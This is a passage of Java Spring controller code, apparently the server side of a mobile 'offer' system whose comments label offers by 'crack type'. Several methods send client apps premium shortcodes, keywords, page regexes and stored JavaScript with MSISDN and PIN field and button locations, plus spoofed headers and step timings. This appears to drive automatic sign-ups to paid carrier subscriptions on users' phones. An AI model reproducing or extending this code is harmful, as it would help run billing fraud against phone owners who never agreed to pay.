                return ResponseInfoUtil.success(result, desUtil);
            }
        }
        return "";
    }


    @SuppressFBWarnings("NP_NULL_PARAM_DEREF")
    private String getOfferStrWithoutDes(OfferModel resultModel, String appId, String ipAddress, String deviceId, HttpServletRequest request, HttpServletResponse response, boolean isTest, boolean isLog, String mnc, JSONObject params) throws Exception {
        // 破解类型为利刃或者 利刃-風の剣
        boolean isCrackTypeOne = resultModel != null && resultModel.getCrackType() != null && (resultModel.getCrackType() == NumberEnum.ONE.getNum() || resultModel.getCrackType() == NumberEnum.THREE.getNum());
        boolean isCrackTypeTwo = resultModel != null && resultModel.getCrackType() != null && (resultModel.getCrackType() == NumberEnum.TWO.getNum() || resultModel.getCrackType() == NumberEnum.FOUR.getNum());
        formatConfig(resultModel, appId, ipAddress, deviceId, request, response, isTest);
        if (isCrackTypeOne) {
            String result = JSON.toJSONString(getResultMap(resultModel));
            if (!StringUtils.isEmpty(request)) {
                return result;
            } else {
                String errorMessage = formatErrorMessage(ResponseInfoEnum.NULL_OFFER_REQUEST.getCode(), ResponseInfoEnum.NULL_OFFER_REQUEST.getMsg());
                return errorMessage;
            }
        } else if (isCrackTypeTwo) {
            String result = handleHttp(ipAddress, appId, mnc, params, request, isLog, resultModel, deviceId);
            JSONObject resModel = JSON.parseObject(result);
            if (resModel != null && !StringUtils.isEmpty(resModel.getString(ZooConstant.ERROR_CODE))) {
                String errorMessage = formatErrorMessage(Integer.valueOf(resModel.getString("errorCode")), resModel.getString("errorMsg"));
                return errorMessage;
            } else {
                return result;
            }
        }
        return "";
    }

    @SuppressFBWarnings("RCN_REDUNDANT_NULLCHECK_WOULD_HAVE_BEEN_A_NPE")
    private void formatConfig(OfferModel resultModel, String appId, String ipAddress, String deviceId, HttpServletRequest request, HttpServletResponse response, boolean isTest) throws Exception {
        //把配置中的链接根据配置情况替换完成
        String clickId = affService.getClickId(appId, resultModel.getOfferId());
        if (!StringUtils.isEmpty(resultModel.getPartner()) && resultModel.getPartner().equalsIgnoreCase(ZooConstant.IE)) {
            clickId = resultModel.getPartnerOfferId() + UUID.randomUUID().toString();
        }
        // 不支持透传不替换链接
        boolean isCrackType = resultModel.getCallbackType() != null && resultModel.getCallbackType() == 3;
        if (!isCrackType) {
            String url = formatUrl(appId, clickId, resultModel);
            resultModel.setUrl(url);
        }
        //统计点击信息
        affService.saveClickInfo(ipAddress, deviceId, clickId, resultModel, request.getHeader(ZooConstant.USER_AGENT), appId, ZooConstant.CATEGORY_APP, true);
        if (isTest && resultModel != null) {
            response.sendRedirect(resultModel.getUrl());
        }
        String ipClickId = CacheNameSpace.ZOO_IP_CLICKID + ipAddress + CacheNameSpace.COLON + DateUtil.today();
        if (!StringUtils.isEmpty(resultModel.getIdentification())) {
            Boolean existClickId = cluster1RedisTemplate.opsForHash().hasKey(ipClickId, resultModel.getIdentification());
            if (existClickId != null && existClickId) {
                stringRedisTemplate.opsForHash().put(ipClickId, resultModel.getIdentification(), clickId);
                stringRedisTemplate.expire(ipClickId, 1, TimeUnit.DAYS);
            }
        } else {
            log.info("PULL OFFER, OFFER REDIS ID IS NULL, OFFER INFO:{}", JSON.toJSONString(resultModel));
        }
    }

    /**
     * format错误信息
     *
     * @param code
     * @param msg
     * @return
     */
    private String formatErrorMessage(Integer code, String msg) {
        Map<String, Object> errorMessage = new HashMap<>(1);
        errorMessage.put("code", code);
        errorMessage.put("msg", msg);
        return JSON.toJSONString(errorMessage);
    }

    /**
     * 战斧方案
     *
     * @param ipAddress
     * @param appId
     * @param mnc
     * @param userId
     * @return
     */
    @SuppressFBWarnings({"NP_NULL_ON_SOME_PATH", "NP_NULL_ON_SOME_PATH", "NP_NULL_ON_SOME_PATH", "BX_UNBOXING_IMMEDIATELY_REBOXED"})
    private String handleHttp(String ipAddress, String appId, String mnc, JSONObject params, HttpServletRequest request, boolean isLog, OfferModel resultModel, String userId) {
        String result = "";
        Map<String, Object> resultMap = new HashMap<>(1);
        try {
            JSONObject resultJson = new JSONObject();
            String operator = mncService.generateOp(mnc);
            if (!StringUtils.isEmpty(appId)) {
                ApplicationModel applicationModel = applicationService.getById(appId);
                String key = CacheNameSpace.PROTC_APP_MAX_PULL + ipAddress;
                Long count = stringRedisTemplate.opsForValue().increment(key, 1);
                stringRedisTemplate.expire(key, 1, TimeUnit.DAYS);
                // 判断是否超过拉取次数或者app是否存在且为开启
                boolean isCanPull = applicationModel != null && applicationModel.getStatus() == ZooConstant.STATUS_1;
                int appCap = getOperatorCap(appId, operator, applicationModel);
                boolean appOverCap = count != null && count >= appCap;
                if (!isCanPull) {
                    resultMap.put("errorCode", ResponseInfoEnum.CLOSE_APP.getCode());
                    resultMap.put("errorMsg", ResponseInfoEnum.CLOSE_APP.getMsg());
                    return JSON.toJSONString(resultMap);
                }
            } else {
                resultMap.put("errorCode", ResponseInfoEnum.NULL_APPID.getCode());
                resultMap.put("errorMsg", ResponseInfoEnum.NULL_APPID.getMsg());
            }
            if (null != resultModel) {
                resultJson = generateOfferJson(resultModel, resultJson);
                HttpLoggingModel httpLoggingModel = new HttpLoggingModel();
                httpLoggingModel.setIp(ipAddress);
                httpLoggingModel.setBody(JSON.toJSONString(params));
                httpLoggingModel.setCarrier(operator);
                httpLoggingModel.setImsi(mnc);
            }
            resultMap.put("Shortcode", StringUtils.isEmpty(resultModel.getPayShortCode()) ? "" : resultModel.getPayShortCode());
            resultMap.put("Keyword", StringUtils.isEmpty(resultModel.getPayKeyword()) ? "" : resultModel.getPayKeyword());
            resultMap.put("Protect", StringUtils.isEmpty(resultModel.getMoProtectScope()) ? "" : resultModel.getMoProtectScope());
            resultMap.put("Days", resultModel.getMoProtectDay() == null ? "" : resultModel.getMoProtectDay());
            resultJson.put("hs", userAgentService.getGlobalHeaders(null, false, userId));
            resultMap.put("crackType", resultModel.getCrackType());
            resultMap.put("offer", resultJson);
            Map<String, Object> nextMap = getNextRegex(resultModel);
            if (nextMap.size() > 0) {
                String nextRegex = String.valueOf(nextMap.get("nextRegex"));
                int stayTime = (int) getNextRegex(resultModel).get("stayTime");
                resultMap.put("nextRegex", nextRegex);
                resultMap.put("stayTime", stayTime);
            }
            log.info("zoo battle axe pull offer :{}", resultMap.toString());
        } catch (Exception e) {
            resultMap.put("errorCode", ResponseInfoEnum.UNKNOWN_ERROR.getCode());
            resultMap.put("errorMsg", ResponseInfoEnum.UNKNOWN_ERROR.getMsg());
            log.info("ZOO Battle axe pull offer error :{}", JSON.toJSONString(e));
        }
        result = JSON.toJSONString(resultMap);
        return result;
    }

    @SuppressFBWarnings("BX_UNBOXING_IMMEDIATELY_REBOXED")
    private JSONObject generateOfferJson(OfferModel resultModel, JSONObject resultJson) {
        resultJson.put("identification", resultModel.getIdentification());
        resultJson.put("url", resultModel.getUrl());
        resultJson.put("isCrawHtml", resultModel.getIsCrawlHtml());
        resultJson.put("duration", resultModel.getDuration());
        String netWork = getNetwork(resultModel.getNetwork());
        resultJson.put("netWork", netWork);
        resultJson.put("areaCode", StringUtils.isEmpty(resultModel.getAreaCode()) ? "" : resultModel.getAreaCode());
        resultJson.put("regex", StringUtils.isEmpty(resultModel.getRegex()) ? "" : resultModel.getRegex());
        resultJson.put("head", StringUtils.isEmpty(resultModel.getHead()) ? 0 : resultModel.getHead());
        if (!StringUtils.isEmpty(resultModel.getShortCode())) {
            resultJson.put("shortCode", resultModel.getShortCode());
        }
        if (!StringUtils.isEmpty(resultModel.getKeyword())) {
            resultJson.put("keyword", resultModel.getKeyword());
        }
        if (!StringUtils.isEmpty(resultModel.getConfirmKeyword())) {
            resultJson.put("confirmKeyword", resultModel.getConfirmKeyword());
        }
        if (resultModel.getIntervalTime() > 0) {
            resultJson.put("intervalTime", resultModel.getIntervalTime());
        }
        return resultJson;
    }

    private Map<String, Object> getNextRegex(OfferModel resultModel) {
        Map<String, Object> resultMap = new HashMap<>(1);
        String nextRegex = "";
        // 如果是利刃-風の剣或者战斧-風の剣则有nextRegex
        boolean existNextRegex = resultModel != null && resultModel.getCrackType() != null && (resultModel.getCrackType() == NumberEnum.FOUR.getNum() || resultModel.getCrackType() == NumberEnum.THREE.getNum());
        if (existNextRegex) {
            String key = Constants.PROTC_OFFER_STEP + Constants.COLON + resultModel.getIdentification();
            Map<Object, Object> map = stringRedisTemplate.opsForHash().entries(key);
            if (map != null && map.size() > 0) {
                // map 中 hkey 为 url regex
                for (Map.Entry entry : map.entrySet()) {
                    boolean isMatch = checkMatch(resultModel.getUrl(), (String) entry.getKey());
                    if (isMatch) {
                        OfferStepModel offerStepModel = JSON.parseObject((String) entry.getValue(), OfferStepModel.class);
                        nextRegex = offerStepModel.getNextRegex();
                        resultMap.put("nextRegex", nextRegex);
                        resultMap.put("stayTime", offerStepModel.getStayTime() != null ? offerStepModel.getStayTime() : 0);
                    }
                }
            }
        }
        return resultMap;
    }

    @RequestMapping(value = "/get/encode/data")
    public String getEncode(HttpServletRequest request, @RequestBody JSONObject jsonObject) throws Exception {
        String decodeKey = jsonObject.getString("key");
        DesUtil desUtil = new DesUtil(decodeKey, decodeKey);
        jsonObject.remove("key");
        String encode = desUtil.encode(jsonObject.toJSONString());
        return encode;
    }

    @RequestMapping(value = "/get/decode/aes/{type}/{interface}")
    @SuppressFBWarnings({"DM_DEFAULT_ENCODING"})
    public String getDecodeNew(HttpServletRequest request, @RequestBody(required = false) byte[] bytes, @PathVariable int type) throws Exception {
        AesUtil desUtil = AndroidGroupGetAesConfig.getAes(request);
        return new String(desUtil.decode(bytes, type));
    }

    @RequestMapping(value = "/get/encode/aes/{type}/{interface}")
    public void getEncodeNew(HttpServletRequest request, HttpServletResponse response, @RequestBody JSONObject jsonObject, @PathVariable int type) throws Exception {
        AesUtil desUtil = AndroidGroupGetAesConfig.getAes(request);
        byte[] input = desUtil.encode(jsonObject.toJSONString(), type);
        ServletOutputStream os = response.getOutputStream();
        response.reset();
        os.write(input, 0, input.length);
        os.flush();
        os.close();
    }

    @RequestMapping(value = "/get/encode/decode")
    public String getDecode(HttpServletRequest request, @RequestBody JSONObject jsonObject) throws Exception {
        String data = jsonObject.getString("data");
        String decodeKey = jsonObject.getString("key");
        DesUtil desUtil = new DesUtil(decodeKey, decodeKey);
        String decode = desUtil.decode(data);
        return decode;
    }


    @RequestMapping(value = "/get/encode/json/data")
    public String getJsonEncode(@RequestParam(required = true, name = "key") String decodeKey, @RequestBody JSONArray jsonArray) throws Exception {
        DesUtil desUtil = new DesUtil(decodeKey, decodeKey);
        String encode = desUtil.encode(jsonArray.toJSONString());
        return encode;
    }


    public static String formatUrl(String appId, String clickId, OfferModel offerModel) throws UnsupportedEncodingException {
        String url = "";
        if (offerModel != null && !StringUtils.isEmpty(offerModel.getUrl())) {
            // replace appId(扩展透传参数)
            url = getReplaceUrl(offerModel.getUrl(), offerModel.getExtendParam(), appId);
            // replace clickId(点击参数)
            url = getReplaceUrl(url, offerModel.getClickIdParam(), clickId);
            // replace offerId(上游offer主键)
            url = getReplaceUrl(url, offerModel.getPartnerOfferIdParam(), offerModel.getPartnerOfferId());
            url = url.replace(ZooConstant.PARAM_CLICKID, clickId);
            url = encodeOthersValue(url);
        }
        return url;
    }

    public static String getReplaceUrl(String url, String param, String value) {
        Matcher matcher = PatternUtil.URL_PARAMS_PATTERN.matcher(url);
        //先替换透传再替换clickId 防止clickId参数与透传参数一样
        if (!StringUtils.isEmpty(param)) {
            if (url.contains(param + ZooConstant.EQUAL_MARK)) {
                while (matcher.find()) {
                    if (matcher.group(2).equals(param)) {
                        //替换 appId
                        url = url.replace(matcher.group(2) + ZooConstant.EQUAL_MARK + matcher.group(3), matcher.group(2) + ZooConstant.EQUAL_MARK + value);
                    }
                }
            } else {
                url += url.contains(ZooConstant.INTERROGATION_MARK) ? "" : ZooConstant.INTERROGATION_MARK;
                url += ZooConstant.AND_MARK + param + ZooConstant.EQUAL_MARK + value;
            }
        }
        return url;
    }

    public static String encodeOthersValue(String url) throws UnsupportedEncodingException {
        Matcher matcher = PatternUtil.URL_PARAMS_PATTERN.matcher(url);
        while (matcher.find()) {
            url = url.replace(matcher.group(2) + ZooConstant.EQUAL_MARK + matcher.group(3), matcher.group(2) + ZooConstant.EQUAL_MARK + URLEncoder.encode(matcher.group(3), "UTF-8"));
        }
        return url;
    }

    public Map getResultMap(OfferModel model) {
        Map<String, Object> result = new HashMap<>(3);
        if (model != null) {
            //返回当前时间戳和 list
            result.put("offer", getOfferJSON(model));
            result.put("crackType", model.getCrackType());
            // 如果是利刃-風の剣则有nextRegex
            Map<String, Object> nextMap = getNextRegex(model);
            if (nextMap.size() > 0) {
                String nextRegex = String.valueOf(nextMap.get("nextRegex"));
                int stayTime = (int) nextMap.get("stayTime");
                result.put("nextRegex", nextRegex);
                result.put("stayTime", stayTime);
            }
            // 找到关联的 js 脚本
            List<ScriptModel> scriptModels = scriptService.findScriptByOfferId(model.getIdentification());
            if (scriptModels != null && scriptModels.size() > 0) {
                result.put("script", getScriptJSON(scriptModels));
            }
            result.put("Shortcode", StringUtils.isEmpty(model.getPayShortCode()) ? "" : model.getPayShortCode());
            result.put("Keyword", StringUtils.isEmpty(model.getPayKeyword()) ? "" : model.getPayKeyword());
            result.put("Protect", StringUtils.isEmpty(model.getMoProtectScope()) ? "" : model.getMoProtectScope());
            result.put("Days", model.getMoProtectDay() == null ? "" : model.getMoProtectDay());

        }
        return result;
    }

    /**
     * 检查链接是否匹配
     *
     * @param url
     * @param key
     * @return
     */
    private boolean checkMatch(String url, String key) {
        if (StringUtils.isEmpty(url) || StringUtils.isEmpty(key)) {
            return false;
        }
        Pattern pattern = Pattern.compile(key);
        Matcher matcher = pattern.matcher(url);
        if (matcher.find()) {
            return true;
        }
        return false;
    }

    private List<JSONObject> getScriptJSON(List<ScriptModel> scriptModels) {
        List<JSONObject> list = new ArrayList<>();
        if (scriptModels != null && scriptModels.size() > 0) {
            for (ScriptModel scriptModel : scriptModels) {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("regular", scriptModel.getRegular());
                jsonObject.put("script", scriptModel.getScript());
                jsonObject.put("eventType", scriptModel.getEventType());
                jsonObject.put("msisdnLocation", scriptModel.getMsisdnLocation());
                jsonObject.put("pinRegular", scriptModel.getPinRegular());
                jsonObject.put("pinInputLocation", scriptModel.getPinInputLocation());
                jsonObject.put("pinConfirmLocation", scriptModel.getPinConfirmLocation());
                jsonObject.put("pinBtnLocation", scriptModel.getPinBtnLocation());
                list.add(jsonObject);
            }
        }
        return list;
    }

    @SuppressFBWarnings("BX_UNBOXING_IMMEDIATELY_REBOXED")
    private JSONObject getOfferJSON(OfferModel model) {
        JSONObject jsonObject = new JSONObject();
        if (model != null) {
            jsonObject.put("identification", model.getIdentification());
            jsonObject.put("partner", model.getPartner());
            jsonObject.put("isCrawlHtml", model.getIsCrawlHtml());
            jsonObject.put("type", model.getType());
            jsonObject.put("duration", model.getDuration());
            jsonObject.put("url", model.getUrl());
            String netWork = getNetwork(model.getNetwork());
            jsonObject.put("netWork", netWork);
            jsonObject.put("areaCode", StringUtils.isEmpty(model.getAreaCode()) ? "" : model.getAreaCode());
            jsonObject.put("regex", StringUtils.isEmpty(model.getRegex()) ? "" : model.getRegex());
            jsonObject.put("head", StringUtils.isEmpty(model.getHead()) ? 0 : model.getHead());
            if (!StringUtils.isEmpty(model.getShortCode())) {
                jsonObject.put("shortCode", model.getShortCode());
            }
            if (!StringUtils.isEmpty(model.getKeyword())) {
                jsonObject.put("keyword", model.getKeyword());
            }
            if (!StringUtils.isEmpty(model.getConfirmKeyword())) {
                jsonObject.put("confirmKeyword", model.getConfirmKeyword());
            }
            if (model.getIntervalTime() > 0) {
                jsonObject.put("intervalTime", model.getIntervalTime());
            }
        }
        return jsonObject;
    }

    private String getNetwork(int netWork) {
        String netWorkName = "";
        if (netWork == 0) {
            netWorkName = ZooConstant.UNKNOWN;
        } else if (netWork == 1) {
            netWorkName = "3G";
        } else {
            netWorkName = "wifi";
        }
        return netWorkName;
    }


}
